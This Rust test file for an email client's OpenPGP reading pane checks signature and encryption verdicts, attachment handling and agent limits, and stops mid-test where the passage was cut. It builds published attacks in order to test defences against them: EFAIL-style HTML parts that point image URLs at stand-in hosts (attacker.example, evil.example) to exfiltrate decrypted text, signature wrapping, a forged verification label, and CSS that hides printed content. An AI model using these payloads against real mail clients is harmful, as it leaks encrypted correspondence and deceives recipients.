//! Signed and encrypted mail as the reading pane shows it: the verdict of the whole message and of each part, the
//! page the parts are drawn on, and the published attacks on mail clients (EFAIL's direct exfiltration, signature
//! wrapping, hidden parts, a painted frame), each made here with real keys.

use pe_core::keys::KeySource;
use pe_core::protect::Tone;
use pe_core::{Core, Options, PasswordStore};
use pe_store::{AccountSettings, Auth, Security, Store};

struct World {
    core: Core,
    dir: pe_testkit::TempDir,
    me: pe_pgp::Cert,
    alice: pe_pgp::SecretKey,
    mallory: pe_pgp::SecretKey,
}

fn now() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs() as i64
}

/// A store with the account me@example.org and its key, Alice's public key known, Mallory's not
fn world(name: &str) -> World {
    let dir = pe_testkit::TempDir::new(name);
    let path = dir.path().join("store.db");
    let account = {
        let store = Store::open(&path).unwrap();
        store
            .add_account(&AccountSettings {
                name: "Me".into(),
                email: "me@example.org".into(),
                username: "me@example.org".into(),
                imap_host: "imap.invalid".into(),
                imap_port: 993,
                imap_security: Security::Tls,
                smtp_host: "smtp.invalid".into(),
                smtp_port: 465,
                smtp_security: Security::Tls,
                auth: Auth::Password,
            })
            .unwrap()
    };
    let core = Core::open_with(
        &path,
        Options {
            passwords: PasswordStore::Memory,
            ..Default::default()
        },
        |_| {},
    )
    .unwrap();
    let mine = core.pgp_generate(account).unwrap();
    let me = pe_pgp::read_certs(core.pgp_export(&mine).unwrap().as_bytes())
        .unwrap()
        .remove(0);
    let alice = pe_pgp::generate("Alice", &["alice@example.org".into()], now() - 60).unwrap();
    let mallory = pe_pgp::generate("Mallory", &["mallory@example.net".into()], now() - 60).unwrap();
    core.pgp_import(alice.cert().armored().as_bytes(), None, KeySource::Paste)
        .unwrap();
    // Alice is in the Address Book: the labels name her by its name
    core.save_card(&pe_store::Card {
        name: "Alice Example".into(),
        addresses: vec!["alice@example.org".into()],
        ..Default::default()
    })
    .unwrap();
    World {
        core,
        dir,
        me,
        alice,
        mallory,
    }
}

impl World {
    fn view(&self, raw: &str) -> pe_core::MessageView {
        let file = self.dir.path().join("message.eml");
        std::fs::write(&file, raw).unwrap();
        self.core.file_view(&file, false).unwrap()
    }
}

fn headers(from: &str, content_type: &str) -> String {
    format!(
        "From: {from}\r\nTo: me@example.org\r\nSubject: Test\r\nDate: Sun, 15 Nov 2026 10:00:00 +0000\r\n\
         Message-ID: <t@example.org>\r\nMIME-Version: 1.0\r\nContent-Type: {content_type}\r\n\r\n"
    )
}

fn text(body: &str) -> String {
    format!("Content-Type: text/plain; charset=utf-8\r\n\r\n{body}")
}

/// A multipart/signed entity (without top headers) of `content` signed by `key`, as `signed_part` returns it with
/// its own Content-Type line first
fn signed_part(content: &str, key: &pe_pgp::SecretKey, boundary: &str) -> String {
    let signature = pe_pgp::sign_detached(content.as_bytes(), key, now()).unwrap();
    format!(
        "Content-Type: multipart/signed; micalg={}; protocol=\"application/pgp-signature\"; boundary=\"{boundary}\"\r\n\r\n\
         --{boundary}\r\n{content}\r\n--{boundary}\r\nContent-Type: application/pgp-signature\r\n\r\n{}\r\n--{boundary}--\r\n",
        signature.micalg, signature.signature
    )
}

/// A whole message: the headers of `from` and the part `entity` (which starts with its own Content-Type line)
fn message(from: &str, entity: &str) -> String {
    let (first, rest) = entity.split_once("\r\n").unwrap();
    let content_type = first.strip_prefix("Content-Type: ").unwrap();
    let rest = rest.strip_prefix("\r\n").unwrap_or(rest);
    let mut out = headers(from, content_type);
    // continuation lines of the Content-Type stay with it
    out.push_str(rest);
    out
}

fn encrypted_part(inner: &str, to: &[&pe_pgp::Cert], signer: Option<&pe_pgp::SecretKey>, boundary: &str) -> String {
    let armored = pe_pgp::encrypt(inner.as_bytes().to_vec(), to, &[], signer, now()).unwrap();
    format!(
        "Content-Type: multipart/encrypted; protocol=\"application/pgp-encrypted\"; boundary=\"{boundary}\"\r\n\r\n\
         --{boundary}\r\nContent-Type: application/pgp-encrypted\r\n\r\nVersion: 1\r\n--{boundary}\r\n\
         Content-Type: application/octet-stream\r\n\r\n{armored}\r\n--{boundary}--\r\n"
    )
}

fn mixed(parts: &[String]) -> String {
    let mut out = String::from("Content-Type: multipart/mixed; boundary=\"mix\"\r\n\r\n");
    for part in parts {
        out.push_str("--mix\r\n");
        out.push_str(part);
        out.push_str("\r\n");
    }
    out.push_str("--mix--\r\n");
    out
}

/// All that is shown of a view: its page and every part's document
fn shown(view: &pe_core::MessageView) -> String {
    let mut all = view.document.clone();
    for document in &view.part_documents {
        all.push_str(document);
    }
    all
}

fn tones(view: &pe_core::MessageView) -> Vec<Tone> {
    view.protection
        .as_ref()
        .unwrap()
        .parts
        .iter()
        .map(|part| part.tone)
        .collect()
}

#[test]
fn plain_mail_is_as_before() {
    let w = world("pgp-plain");
    let view = w.view(&message("alice@example.org", &text("Hello")));
    assert!(view.protection.is_none());
    assert!(!shown(&view).contains("<section class=\"pe-p"));
}

#[test]
fn signed_by_the_sender() {
    let w = world("pgp-signed");
    let raw = message(
        "Alice <alice@example.org>",
        &signed_part(&text("Hello Bob"), &w.alice, "s"),
    );
    let view = w.view(&raw);
    let protection = view.protection.as_ref().unwrap();
    assert_eq!(protection.tone, Tone::Good, "{protection:?}");
    assert!(
        protection.text.contains("Signed by Alice Example"),
        "{}",
        protection.text
    );
    assert!(!protection.encrypted);
    assert!(shown(&view).contains("Hello Bob"));
    // verified, it is green
    w.core
        .pgp_set_verified(&w.alice.fingerprint(), "alice@example.org", true)
        .unwrap();
    let view = w.view(&raw);
    assert_eq!(view.protection.as_ref().unwrap().tone, Tone::Verified);
}

#[test]
fn signed_by_someone_who_is_not_the_sender() {
    let w = world("pgp-other");
    let raw = message("Bob <bob@example.org>", &signed_part(&text("Hello"), &w.alice, "s"));
    let protection = w.view(&raw).protection.unwrap();
    assert_eq!(protection.tone, Tone::Warning);
    assert!(protection.text.contains("not the sender"), "{}", protection.text);
    // two From addresses: nobody is the sender
    let two = raw.replacen(
        "From: Bob <bob@example.org>",
        "From: alice@example.org, bob@example.org",
        1,
    );
    assert_eq!(w.view(&two).protection.unwrap().tone, Tone::Warning);
}

#[test]
fn changed_text_does_not_match() {
    let w = world("pgp-changed");
    let raw = message(
        "alice@example.org",
        &signed_part(&text("Pay Bob 10 euros"), &w.alice, "s"),
    );
    let changed = raw.replacen("Pay Bob 10 euros", "Pay Bob 99 euros", 1);
    let protection = w.view(&changed).protection.unwrap();
    assert_eq!(protection.tone, Tone::Warning);
    assert!(protection.text.contains("does not match"), "{}", protection.text);
}

#[test]
fn a_key_that_is_not_the_one_in_use_does_not_sign_for_the_sender() {
    // Mallory makes a key with Alice's address and gets it stored (an Autocrypt header of a forged message, a file):
    // it waits for the user's decision beside Alice's, and what it signs is not Alice's, before and after Keep
    let w = world("pgp-not-in-use");
    let impostor = pe_pgp::generate("Alice", &["alice@example.org".into()], now() - 60).unwrap();
    w.core
        .pgp_import(impostor.cert().armored().as_bytes(), None, KeySource::Paste)
        .unwrap();
    let raw = message(
        "Alice <alice@example.org>",
        &signed_part(&text("Pay Mallory 1000 euros"), &impostor, "s"),
    );
    let protection = w.view(&raw).protection.unwrap();
    assert_eq!(protection.tone, Tone::Warning, "{protection:?}");
    assert!(protection.text.contains("another key"), "{}", protection.text);
    w.core.pgp_decide("alice@example.org", false).unwrap();
    assert_eq!(w.view(&raw).protection.unwrap().tone, Tone::Warning);
    // Alice's own key still signs for her
    let raw = message("Alice <alice@example.org>", &signed_part(&text("Hi"), &w.alice, "s"));
    assert_eq!(w.view(&raw).protection.unwrap().tone, Tone::Good);
}

#[test]
fn a_sender_other_than_from_is_not_signed_for() {
    // the plan's From rule: a Sender that differs from the one From never gives blue or green
    let w = world("pgp-sender");
    let raw = message(
        "Alice <alice@example.org>",
        &signed_part(&text("Hello Bob"), &w.alice, "s"),
    )
    .replacen("To: ", "Sender: mallory@example.net\r\nTo: ", 1);
    let protection = w.view(&raw).protection.unwrap();
    assert_eq!(protection.tone, Tone::Warning, "{protection:?}");
    // the same address as From changes nothing
    let raw = message(
        "Alice <alice@example.org>",
        &signed_part(&text("Hello Bob"), &w.alice, "s"),
    )
    .replacen("To: ", "Sender: Alice@example.org\r\nTo: ", 1);
    assert_eq!(w.view(&raw).protection.unwrap().tone, Tone::Good);
}

#[test]
fn an_unknown_key() {
    let w = world("pgp-unknown");
    let raw = message("mallory@example.net", &signed_part(&text("Hi"), &w.mallory, "s"));
    let protection = w.view(&raw).protection.unwrap();
    assert_eq!(protection.tone, Tone::Neutral);
    assert!(protection.text.contains("not known"), "{}", protection.text);
}

#[test]
fn encrypted_and_signed() {
    let w = world("pgp-encrypted");
    let inner = text("The secret plan");
    let raw = message(
        "alice@example.org",
        &encrypted_part(&inner, &[&w.me], Some(&w.alice), "e"),
    );
    assert!(!raw.contains("secret plan"));
    let view = w.view(&raw);
    let protection = view.protection.as_ref().unwrap();
    assert!(protection.encrypted);
    assert_eq!(protection.tone, Tone::Good);
    assert!(protection.text.starts_with("Encrypted."), "{}", protection.text);
    assert!(protection.text.contains("Alice"), "{}", protection.text);
    assert!(shown(&view).contains("The secret plan"));
}

#[test]
fn encrypted_to_someone_else() {
    let w = world("pgp-nokey");
    let raw = message(
        "alice@example.org",
        &encrypted_part(&text("Not for you"), &[w.mallory.cert()], None, "e"),
    );
    let view = w.view(&raw);
    let protection = view.protection.as_ref().unwrap();
    assert_eq!(protection.tone, Tone::Warning);
    assert!(protection.text.contains("do not have"), "{}", protection.text);
    assert!(!shown(&view).contains("Not for you"));
}

#[test]
fn changed_ciphertext_is_not_shown() {
    let w = world("pgp-tampered");
    let raw = message(
        "alice@example.org",
        &encrypted_part(&text("Original"), &[&w.me], None, "e"),
    );
    // a character of the armored data changed, near its end (the encrypted data, not the headers)
    let end = raw.find("-----END PGP MESSAGE-----").unwrap();
    let at = raw[..end - 20].rfind(|c: char| c.is_ascii_alphanumeric()).unwrap();
    let mut changed = raw.clone().into_bytes();
    changed[at] = if changed[at] == b'A' { b'B' } else { b'A' };
    let view = w.view(&String::from_utf8(changed).unwrap());
    let protection = view.protection.as_ref().unwrap();
    assert_eq!(protection.tone, Tone::Warning);
    assert!(!shown(&view).contains("Original"));
}

#[test]
fn parts_signed_apart() {
    let w = world("pgp-mixed");
    let raw = message(
        "alice@example.org",
        &mixed(&[
            text("An unsigned note on top"),
            signed_part(&text("The signed contract"), &w.alice, "s"),
            text("-- \r\nSent through the list"),
        ]),
    );
    let view = w.view(&raw);
    assert_eq!(tones(&view), [Tone::Neutral, Tone::Good, Tone::Neutral]);
    let protection = view.protection.as_ref().unwrap();
    assert!(
        protection
            .text
            .contains("3 parts: 1 signed, 2 without a confirmed signature"),
        "{}",
        protection.text
    );
    // Details: each part, the signed one with its key and time
    let details = protection.details();
    assert!(details.contains("Part 2: Signed by Alice Example"), "{details}");
    assert!(details.contains(&pe_pgp::grouped(&w.alice.fingerprint())), "{details}");
    assert_eq!(protection.parts[0].label, "Not signed");
    // three documents, each its own frame
    assert_eq!(view.document.matches("<iframe").count(), 3);
}

#[test]
fn efail_a_decrypted_part_can_not_be_wrapped_by_its_neighbours() {
    // direct exfiltration: an HTML part opens an image address, the encrypted part follows, an HTML part closes it
    let w = world("pgp-efail");
    let open = "Content-Type: text/html\r\n\r\n<img src=\"http://attacker.example/";
    let close = "Content-Type: text/html\r\n\r\n\">";
    let secret = encrypted_part(&text("The secret plan"), &[&w.me], None, "e");
    let raw = message("alice@example.org", &mixed(&[open.into(), secret, close.into()]));
    let view = w.view(&raw);
    assert_eq!(view.protection.as_ref().unwrap().parts.len(), 3);
    // the decrypted text is only ever in its own part's document, never in one with the attacker's address
    let with_secret: Vec<&String> = view
        .part_documents
        .iter()
        .filter(|document| document.contains("The secret plan"))
        .collect();
    assert_eq!(with_secret.len(), 1);
    assert!(!with_secret[0].contains("attacker.example"));
    assert!(
        !view.document.contains("The secret plan"),
        "the page holds no part's text"
    );
    // and no part of the page loads anything from the internet
    assert!(view.document.contains("img-src data:;"));
}

#[test]
fn a_signed_part_wrapped_in_someone_elses_message() {
    // Mallory forwards a part Alice once signed inside his own message: it is a part, not the message, and it is not
    // signed by the sender
    let w = world("pgp-wrapped");
    let old = signed_part(&text("I agree"), &w.alice, "s");
    let raw = message("mallory@example.net", &mixed(&[text("Alice says:"), old]));
    let view = w.view(&raw);
    assert_eq!(tones(&view), [Tone::Neutral, Tone::Warning]);
    assert!(
        view.protection.as_ref().unwrap().parts[1]
            .label
            .contains("not the sender")
    );
}

#[test]
fn a_signed_part_hidden_in_an_alternative() {
    // the signed part is the alternative the parser would not show: it never makes the shown text look signed
    let w = world("pgp-hidden");
    let alternative = format!(
        "Content-Type: multipart/alternative; boundary=\"alt\"\r\n\r\n--alt\r\n{}\r\n--alt\r\n{}\r\n--alt--\r\n",
        text("Pay Mallory"),
        signed_part(&text("Hello"), &w.alice, "s")
    );
    let raw = message("alice@example.org", &mixed(&[alternative, text("x")]));
    let view = w.view(&raw);
    assert!(
        tones(&view).iter().all(|tone| *tone == Tone::Neutral),
        "{:?}",
        tones(&view)
    );
}

#[test]
fn a_painted_label_is_only_the_messages_own_markup() {
    let w = world("pgp-painted");
    let fake = "Content-Type: text/html\r\n\r\n<section class=\"pe-p pe-v\"><a class=\"pe-l\" href=\"inboxclassic:part-0\">\
                Signed by Alice, key verified</a></section><p>Pay Mallory</p>";
    let raw = message(
        "alice@example.org",
        &mixed(&[fake.into(), signed_part(&text("Hi"), &w.alice, "s")]),
    );
    let view = w.view(&raw);
    let page = &view.document;
    // the page's own labels are two; the painted one is inside the first part's document only, escaped there
    assert_eq!(page.matches("<a class=\"pe-l\"").count(), 2);
    assert!(!page.contains("href=\"inboxclassic:part-0\">Signed by Alice, key verified"));
    // and the sanitizer kept no inboxclassic: link in the part
    assert!(!page.contains("inboxclassic:part-0&quot;"));
}

#[test]
fn inline_encrypted_and_inline_signed() {
    let w = world("pgp-inline");
    let armored = pe_pgp::encrypt(b"Inline secret".to_vec(), &[&w.me], &[], None, now()).unwrap();
    let raw = message("alice@example.org", &text(&format!("Before\r\n{armored}\r\nAfter")));
    let view = w.view(&raw);
    let protection = view.protection.as_ref().unwrap();
    assert_eq!(protection.parts.len(), 3, "{protection:?}");
    assert!(protection.parts[1].label.contains("Signature not checked"));
    assert!(shown(&view).contains("Inline secret"));
}

#[test]
fn protected_subject() {
    let w = world("pgp-subject");
    let inner =
        "Content-Type: text/plain; charset=utf-8; protected-headers=\"v1\"\r\nSubject: The real subject\r\n\r\nBody";
    let raw = message(
        "alice@example.org",
        &encrypted_part(inner, &[&w.me], Some(&w.alice), "e"),
    )
    .replacen("Subject: Test", "Subject: ...", 1);
    assert_eq!(w.view(&raw).subject, "The real subject");
}

#[test]
fn a_protected_subject_stays_out_of_a_reply() {
    // the sender hid the Subject inside the encryption: a reply or forward, whose Subject goes in the clear, takes
    // the placeholder it travelled under, never the protected one
    let w = world("pgp-subject-reply");
    let inner = "Content-Type: text/plain; charset=utf-8; protected-headers=\"v1\"\r\nSubject: Secret plan\r\n\r\nBody";
    let raw = message(
        "alice@example.org",
        &encrypted_part(inner, &[&w.me], Some(&w.alice), "e"),
    )
    .replacen("Subject: Test", "Subject: ...", 1);
    let folder = stored(&w, 1, &raw);
    for kind in [pe_core::DraftKind::Reply, pe_core::DraftKind::Forward] {
        let draft = w.core.draft(folder, 1, kind).unwrap().unwrap();
        assert!(!draft.subject.contains("Secret"), "{kind:?}: {}", draft.subject);
        assert!(draft.encrypt);
    }
    // the shown subject is the protected one, as the list shows it once decrypted
    assert_eq!(w.view(&raw).subject, "Secret plan");
}

#[test]
fn attachments_come_from_the_decrypted_part() {
    let w = world("pgp-attachment");
    let inner = mixed(&[
        text("See the file"),
        "Content-Type: application/pdf; name=\"plan.pdf\"\r\nContent-Disposition: attachment; filename=\"plan.pdf\"\r\n\
         Content-Transfer-Encoding: base64\r\n\r\nJVBERi0xLjQ="
            .into(),
    ]);
    let raw = message(
        "alice@example.org",
        &encrypted_part(&inner, &[&w.me], Some(&w.alice), "e"),
    );
    let view = w.view(&raw);
    assert_eq!(view.attachments.len(), 1);
    assert_eq!(view.attachments[0].filename, "plan.pdf");
}

#[test]
fn a_reply_quotes_what_was_shown_and_forwards_carry_the_decrypted_files() {
    let w = world("pgp-reply");
    let inner = mixed(&[
        text("The secret plan"),
        "Content-Type: application/pdf; name=\"plan.pdf\"\r\nContent-Disposition: attachment; filename=\"plan.pdf\"\r\n\
         Content-Transfer-Encoding: base64\r\n\r\nJVBERi0xLjQ="
            .into(),
    ]);
    // a part encrypted to someone else beside the one to me: never decrypted, never quoted
    let hidden = encrypted_part(&text("Not for you"), &[w.mallory.cert()], None, "h");
    let raw = message(
        "alice@example.org",
        &mixed(&[encrypted_part(&inner, &[&w.me], Some(&w.alice), "e"), hidden]),
    );
    let file = w.dir.path().join("reply.eml");
    std::fs::write(&file, &raw).unwrap();
    let accounts = w.core.accounts().unwrap();
    let reply = w
        .core
        .file_draft(&file, accounts[0].id, pe_core::DraftKind::Reply)
        .unwrap();
    let quoted = format!("{:?}", reply);
    assert!(quoted.contains("The secret plan"), "{quoted}");
    assert!(!quoted.contains("Not for you"));
    let forward = w
        .core
        .file_draft(&file, accounts[0].id, pe_core::DraftKind::Forward)
        .unwrap();
    assert_eq!(forward.attachments.len(), 1);
    assert_eq!(std::fs::read(&forward.attachments[0]).unwrap(), b"%PDF-1.4");
    // saved from the reading pane, the attachment is the decrypted one
    let (name, content) = w.core.file_attachment(&file, 0).unwrap().unwrap();
    assert_eq!((name.as_str(), content.as_slice()), ("plan.pdf", &b"%PDF-1.4"[..]));
}

/// A key names itself as it likes: the label says the Address Book's name of the address checked, else the address
#[test]
fn a_key_name_never_reaches_the_label() {
    let w = world("pgp-key-name");
    let mallory = pe_pgp::generate("Mallory (key verified)", &["mallory@example.net".into()], now() - 60).unwrap();
    w.core
        .pgp_import(mallory.cert().armored().as_bytes(), None, KeySource::Paste)
        .unwrap();
    let raw = message("mallory@example.net", &signed_part(&text("Trust me"), &mallory, "s"));
    let view = w.view(&raw);
    let text = &view.protection.as_ref().unwrap().text;
    assert!(
        text.contains("mallory@example.net") && !text.contains("key verified)"),
        "{text}"
    );
}

/// Parts encrypted to the user by someone else, around a ciphertext they captured: each its own document, so their
/// markup can not carry the captured plaintext away (EFAIL with encrypted neighbours)
#[test]
fn efail_encrypted_neighbours_are_documents_of_their_own() {
    let w = world("pgp-efail-encrypted");
    let html = |body: &str| format!("Content-Type: text/html; charset=utf-8\r\n\r\n{body}");
    let open = encrypted_part(&html("<img src=\"https://evil.example/?x="), &[&w.me], None, "a");
    let captured = encrypted_part(&text("The secret plan"), &[&w.me], None, "b");
    let close = encrypted_part(&html("\">"), &[&w.me], None, "c");
    let raw = message("mallory@example.net", &mixed(&[open, captured, close]));
    let view = w.view(&raw);
    let protection = view.protection.as_ref().unwrap();
    assert_eq!(protection.parts.len(), 3, "{protection:?}");
    // the secret is drawn as text of its own document, never inside another's attribute
    assert!(shown(&view).contains("The secret plan"));
    assert!(!shown(&view).contains("x=The secret plan") && !shown(&view).contains("x=\nThe secret"));
}

/// A "multipart/encrypted" holding OpenPGP data that is not encrypted (a literal data packet here; a signed message
/// someone wrote to another, in an envelope that only looks encrypted): no encryption, and not shown
#[test]
fn an_envelope_with_nothing_encrypted_is_broken() {
    let w = world("pgp-not-encrypted");
    let data = b"Content-Type: text/plain\r\n\r\nHi Mallory";
    // a literal data packet (RFC 9580 5.9), new format: binary, no file name, no date
    let mut packet = vec![0xCB, (6 + data.len()) as u8, b'b', 0, 0, 0, 0, 0];
    packet.extend_from_slice(data);
    let encoded = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &packet);
    let raw = message(
        "alice@example.org",
        &format!(
            "Content-Type: multipart/encrypted; protocol=\"application/pgp-encrypted\"; boundary=\"e\"\r\n\r\n\
             --e\r\nContent-Type: application/pgp-encrypted\r\n\r\nVersion: 1\r\n--e\r\n\
             Content-Type: application/octet-stream\r\nContent-Transfer-Encoding: base64\r\n\r\n{encoded}\r\n--e--\r\n"
        ),
    );
    let view = w.view(&raw);
    let protection = view.protection.as_ref().unwrap();
    assert_eq!(protection.tone, Tone::Warning, "{protection:?}");
    assert!(!shown(&view).contains("Hi Mallory"));
}

/// An agent can not encrypt: it neither replies to nor forwards encrypted mail, which would put what was encrypted on
/// the server or to its recipients in the clear
#[test]
fn an_agent_does_not_answer_encrypted_mail() {
    let w = world("pgp-agent-answer");
    let raw = message(
        "alice@example.org",
        &encrypted_part(&text("The secret plan"), &[&w.me], Some(&w.alice), "e"),
    );
    let (account, folder) = {
        let store = Store::open(w.dir.path().join("store.db")).unwrap();
        let account = store.accounts().unwrap()[0].id;
        let inbox = pe_store::FolderInfo {
            path: "INBOX".into(),
            name: "INBOX".into(),
            selectable: true,
            ..Default::default()
        };
        store.set_folders(account, &[inbox]).unwrap();
        let folder = store.folders(account).unwrap()[0].id;
        let info = pe_store::MessageInfo {
            uid: 1,
            subject: "...".into(),
            from_address: "alice@example.org".into(),
            ..Default::default()
        };
        store.add_messages(folder, &[info]).unwrap();
        store.set_source(folder, 1, raw.as_bytes()).unwrap();
        (account, folder)
    };
    let host = pe_store::AgentHost {
        id: 1,
        path: "/agent".into(),
        name: "Agent".into(),
        allowed: true,
        levels: pe_store::AgentLevels(u32::MAX),
        accounts: vec![account],
        created: 0,
        last_used: None,
    };
    for kind in [pe_core::DraftKind::Reply, pe_core::DraftKind::Forward] {
        let written = pe_core::agents::Written {
            account,
            original: Some((folder, 1, kind)),
            text: "Here you go".into(),
            signature: true,
            ..Default::default()
        };
        let outcome = w.core.agent_save_draft(&host, &written, None);
        match outcome {
            Err(pe_core::Error::Unavailable(why)) => assert!(why.contains("encrypted"), "{why}"),
            other => panic!("{kind:?}: {other:?}"),
        }
    }
    // the user's own reply opens with Encrypt on and may go only encrypted
    let draft = w.core.draft(folder, 1, pe_core::DraftKind::Reply).unwrap().unwrap();
    assert!(draft.encrypt && draft.quote_encrypted);
}

/// The printout puts the parts on one page, so no part may bring markup: one part's styles or an unclosed element
/// would hide or restyle another under the signed labels. Each part prints as its words, under its label in bold.
#[test]
fn a_part_can_not_hide_another_on_the_printout() {
    let w = world("pgp-print");
    let hostile = "Content-Type: text/html; charset=utf-8\r\n\r\n<style>body>*{display:none}</style>\
                   <div style=\"display:none\">Wire the money to Mallory";
    let raw = message(
        "alice@example.org",
        &mixed(&[hostile.into(), signed_part(&text("Lunch on Friday?"), &w.alice, "s")]),
    );
    let view = w.view(&raw);
    let print = view.print_document.as_deref().unwrap();
    assert!(print.contains("Lunch on Friday?") && print.contains("Wire the money to Mallory"));
    // the parts' section, after the printed header: words only, no style of the message
    let parts = &print[print.find("<p><b>Part 1").unwrap()..];
    assert!(!parts.contains("style") && !parts.contains("display"), "{parts}");
    assert!(parts.contains("<b>Part 2: Signed by Alice Example"), "{parts}");
}

/// A message with `raw` as UID `uid` of the account's Inbox (made on the first call); the folder's id
fn stored(w: &World, uid: u64, raw: &str) -> pe_store::FolderId {
    let store = Store::open(w.dir.path().join("store.db")).unwrap();
    let account = store.accounts().unwrap()[0].id;
    if store.folders(account).unwrap().is_empty() {
        let inbox = pe_store::FolderInfo {
            path: "INBOX".into(),
            name: "INBOX".into(),
            selectable: true,
            ..Default::default()
        };
        store.set_folders(account, &[inbox]).unwrap();
    }
    let folder = store.folders(account).unwrap()[0].id;
    let info = pe_store::MessageInfo {
        uid,
        subject: "Files".into(),
        from_address: "alice@example.org".into(),
        ..Default::default()
    };
    store.add_messages(folder, &[info]).unwrap();
    store.set_source(folder, uid, raw.as_bytes()).unwrap();
    folder
}

fn file(name: &str, content_type: &str, body: &str) -> String {
    format!(
        "Content-Type: {content_type}; name=\"{name}\"\r\nContent-Disposition: attachment; filename=\"{name}\"\r\n\r\n{body}"
    )
}

/// An attachment opened from a message: written into a private folder of the user's, never over another file, and
/// opened again from the same file while it is there; a file that can run code refused with why, naming it, before
/// the message is read again; an encrypted message's file opened with a note, the first time only
#[test]
fn attachments_open_from_a_private_folder() {
    use pe_core::opening::FileKind;
    let w = world("open-attachments");
    let raw = message(
        "alice@example.org",
        &mixed(&[
            text("Two files"),
            file("Contract.pdf", "application/pdf", "%PDF-1.4 the contract"),
            file("setup.exe", "application/octet-stream", "MZ program"),
        ]),
    );
    let folder = stored(&w, 1, &raw);
    let view = w.core.message_view(folder, 1, false).unwrap().unwrap();
    let kinds: Vec<(FileKind, bool)> = view.attachments.iter().map(|a| (a.kind, a.kind.can_open())).collect();
    assert_eq!(kinds, [(FileKind::Pdf, true), (FileKind::Program, false)]);
    // the words of the strip: the tooltip, a line each, and the refusal naming the file
    let pdf = &view.attachments[0];
    assert_eq!(pdf.tooltip, format!("Contract.pdf ({})", pdf.size_text));
    assert!(pdf.refusal.is_none());
    let program = &view.attachments[1];
    assert!(program.tooltip.starts_with("setup.exe (") && program.tooltip.contains("\nOpen is off"));
    assert!(
        program
            .refusal
            .as_deref()
            .is_some_and(|r| r.contains("setup.exe") && r.contains("run programs"))
    );

    let opened = w.core.open_attachment(folder, 1, 0).unwrap().unwrap();
    assert_eq!(std::fs::read_to_string(&opened.path).unwrap(), "%PDF-1.4 the contract");
    assert!(opened.path.ends_with("Contract.pdf") && opened.note.is_none());
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = std::fs::metadata(opened.path.parent().unwrap())
            .unwrap()
            .permissions()
            .mode();
        assert_eq!(mode & 0o077, 0, "the folder is the user's alone");
    }
    // opened again (five double-clicks): the same file, one copy
    for _ in 0..4 {
        let again = w.core.open_attachment(folder, 1, 0).unwrap().unwrap();
        assert_eq!(again.path, opened.path);
    }
    // once it is gone (the user deleted it), a new one
    std::fs::remove_file(&opened.path).unwrap();
    let anew = w.core.open_attachment(folder, 1, 0).unwrap().unwrap();
    assert_ne!(anew.path, opened.path);
    assert_eq!(std::fs::read_to_string(&anew.path).unwrap(), "%PDF-1.4 the contract");

    // the program: refused from what the view knew, before the message is read (it is not even there any more)
    Store::open(w.dir.path().join("store.db"))
        .unwrap()
        .remove_messages(folder, &[1])
        .unwrap();
    match w.core.open_attachment(folder, 1, 1) {
        Err(pe_core::Error::Unavailable(why)) => {
            assert!(why.contains("setup.exe") && why.contains("run programs"), "{why}")
        }
        other => panic!("{other:?}"),
    }
    // without a view to go by, refused once it is read
    stored(&w, 3, &raw);
    match w.core.open_attachment(folder, 3, 1) {
        Err(pe_core::Error::Unavailable(why)) => assert!(why.contains("setup.exe"), "{why}"),
        other => panic!("{other:?}"),
    }
    assert!(w.core.open_attachment(folder, 3, 9).unwrap().is_none());

    // an encrypted message's attachment: decrypted to open it, said once
    let inner = mixed(&[text("The plan"), file("plan.txt", "text/plain", "the secret plan")]);
    let encrypted = message(
        "alice@example.org",
        &encrypted_part(&inner, &[&w.me], Some(&w.alice), "e"),
    );
    stored(&w, 2, &encrypted);
    let first = w.core.open_attachment(folder, 2, 0).unwrap().unwrap();
    assert_eq!(std::fs::read_to_string(&first.path).unwrap(), "the secret plan");
    let expected_note = pe_core::i18n::tr(pe_core::i18n::Text::AttachmentDecryptedNote);
    assert_eq!(first.note.as_deref(), Some(expected_note.as_str()), "{first:?}");
    let second = w.core.open_attachment(folder, 2, 0).unwrap().unwrap();
    assert!(second.note.is_none(), "said once");
    // a signed message that is not encrypted: no note (another store, which was never told one)
    let w = world("open-signed-attachment");
    let signed = message(
        "alice@example.org",
        &signed_part(
            &mixed(&[text("Signed"), file("a.txt", "text/plain", "signed words")]),
            &w.alice,
            "s",
        ),
    );
    let folder = stored(&w, 1, &signed);
    let opened = w.core.open_attachment(folder, 1, 0).unwrap().unwrap();
    assert_eq!(std::fs::read_to_string(&opened.path).unwrap(), "signed words");
    assert!(opened.note.is_none(), "nothing was decrypted");
}

/// A message file's attachment: opened from the file a window shows, again the same file, and a page refused
#[test]
fn a_message_files_attachments_open() {
    let w = world("open-file-attachments");
    let raw = message(
        "alice@example.org",
        &mixed(&[
            text("Files"),
            file("notes.txt", "text/plain", "some notes"),
            file(
                "statement",
                "application/octet-stream",
                "<!DOCTYPE html><script>x()</script>",
            ),
        ]),
    );
    let path = w.dir.path().join("saved.eml");
    std::fs::write(&path, &raw).unwrap();
    let view = w.core.file_view(&path, false).unwrap();
    assert!(!view.attachments[1].kind.can_open(), "a page by its content");
    let opened = w.core.file_open_attachment(&path, 0).unwrap().unwrap();
    assert_eq!(std::fs::read_to_string(&opened.path).unwrap(), "some notes");
    assert_eq!(
        w.core.file_open_attachment(&path, 0).unwrap().unwrap().path,
        opened.path
    );
    assert!(matches!(
        w.core.file_open_attachment(&path, 1),
        Err(pe_core::Error::Unavailable(why)) if why.contains("statement")
    ));
}

/// An encrypted message in the Inbox: its text is searched only once it was opened and while Options lets the index
/// keep it, never by an agent, whose reading of it says only that it is encrypted
#[test]
fn decrypted_text_in_the_search_but_never_for_agents() {
    use pe_core::{Scope, Search, Show};
    use pe_store::Sort;
    let w = world("pgp-search");
    let raw = message(
        "alice@example.org",
        &encrypted_part(&text("The zebrafish plan"), &[&w.me], Some(&w.alice), "e"),
    );
    let folder = {
        let store = Store::open(w.dir.path().join("store.db")).unwrap();
        let account = store.accounts().unwrap()[0].id;
        let inbox = pe_store::FolderInfo {
            path: "INBOX".into(),
            name: "INBOX".into(),
            selectable: true,
            ..Default::default()
        };
        store.set_folders(account, &[inbox]).unwrap();
        let folder = store.folders(account).unwrap()[0].id;
        let info = pe_store::MessageInfo {
            uid: 1,
            subject: "Test".into(),
            from_address: "alice@example.org".into(),
            protection: pe_store::Protection::Encrypted,
            ..Default::default()
        };
        store.add_messages(folder, &[info]).unwrap();
